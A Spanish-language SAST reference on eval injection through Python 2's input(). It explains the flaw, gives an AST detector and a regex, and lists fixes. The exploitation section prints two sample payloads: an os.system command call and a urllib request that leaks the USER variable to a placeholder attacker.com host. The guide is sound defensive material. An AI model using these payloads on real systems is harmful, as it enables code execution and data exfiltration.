# Patrón SAST: Inyección Eval en input() de Runtimes Heredados de Python 2

Esta referencia técnica describe el mecanismo de explotación, las reglas de detección estática y los patrones de remediación para la vulnerabilidad de evaluación dinámica no segura en la función `input()` de Python 2 (`VULN-SAST-010`, `CWE-95`, `CWE-78`).

---

## 🏛️ 1. Mecanismo de Fallo: La Dualidad input() vs raw_input() en Python 2

En **Python 2**, el lenguaje implementaba dos funciones de captura de entrada estándar desde la terminal:

1. `raw_input(prompt)`: Lee los caracteres introducidos por el usuario y los retorna directamente como una cadena de texto (`str`). Es la función segura equivalente a `input()` de Python 3.
2. `input(prompt)`: Se definía internamente de forma equivalente a `eval(raw_input(prompt))`. Interpreta y evalúa la entrada del usuario como una expresión sintáctica de Python dentro del contexto global del script en ejecución.

### Escenario de Explotación Observado (`AllHackingTools` - `MainMenu.py`)
En `MainMenu.py` (líneas 14, 98, 125):
```python
#!/usr/bin/python3
# Pero invocado explícitamente mediante: python2 MainMenu.py
op = str(input("Options: "))
```

A pesar de que el resultado se envuelve en `str(...)`, la evaluación de `eval()` ocurre **antes** de la conversión de tipos.

### Vector de Inyección y RCE
Si un operador o script automatizado introduce en la terminal:
```python
__import__('os').system('id; uname -a')
```
O para exfiltración:
```python
__import__('urllib').urlopen('http://attacker.com/leak?u=' + __import__('os').environ['USER'])
```
El motor de Python 2 ejecuta el comando con los privilegios del proceso antes de evaluar la comparación `if op == "1":`.

---

## 🔍 2. Detección Estática SAST (AST y Expresiones Regulares)

### 2.1. Regla de Detección mediante AST en Python
En proyectos que utilicen Python 2 o herramientas de compatibilidad cruzada (e.g. `six`, `future`), buscar llamadas al nodo `ast.Call` cuya función sea el identificador `input`:

```python
import ast

class Python2InputVisitor(ast.NodeVisitor):
    def __init__(self, filename: str):
        self.filename = filename
        self.findings = []

    def visit_Call(self, node: ast.Call):
        if isinstance(node.func, ast.Name) and node.func.id == "input":
            self.findings.append({
                "ruleId": "PYTHON2_INPUT_EVAL_INJECTION",
                "cwe": "CWE-95",
                "severity": "CRITICAL",
                "line": node.lineno,
                "file": self.filename,
                "message": "Uso de input() vulnerable a inyección eval bajo runtimes de Python 2."
            })
        self.generic_visit(node)
```

### 2.2. Expresión Regular para Detección en Scripts Rápidos
```regex
\b(?<!raw_)input\s*\(\s*(?:['"].*?['"]|[a-zA-Z_0-9]+)?\s*\)
```
- Coincide con `input("Options: ")`, `input()`, `op = input()`.
- Descarta llamadas seguras a `raw_input(...)`.

---

## 🛠️ 3. Directivas de Remediación

1. **Migración Completa a Python 3:**
   Sustituir el entorno de ejecución por Python 3.11+, donde `input()` retorna estrictamente `str` y no evalúa expresiones.
2. **Sustitución en Bases de Código Legacy:**
   Si la base de código debe retener compatibilidad temporal con Python 2, reemplazar inmediatamente `input()` por `raw_input()`:
   ```python
   # Seguro en Python 2
   op = raw_input("Options: ").strip()
   ```
3. **Validación de Pertenencia a Conjunto Cerrado:**
   Validar siempre la entrada contra un conjunto de opciones permitidas (Allowlist):
   ```python
   VALID_OPTIONS = {"1", "2", "3", "4", "24"}
   user_choice = raw_input("Options: ").strip()
   if user_choice not in VALID_OPTIONS:
       raise ValueError("Opción no válida seleccionada.")
   ```
